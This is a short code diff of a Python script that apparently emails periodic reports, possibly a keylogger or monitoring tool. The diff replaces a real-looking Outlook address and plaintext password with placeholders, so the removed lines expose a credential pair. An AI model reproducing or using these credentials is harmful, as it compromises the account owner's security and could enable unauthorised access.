@@ -16,8 +16,8 @@ os.chdir(os.path.dirname(os.path.realpath(__file__)))
 logging.basicConfig(level=logging.INFO)
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "susanmendes198510@outlook.com"
-EMAIL_PASSWORD = "Whemeres12!"
+EMAIL_ADDRESS = "email@google.com"
+EMAIL_PASSWORD = "password"
 
 def is_internet_available():
     try:
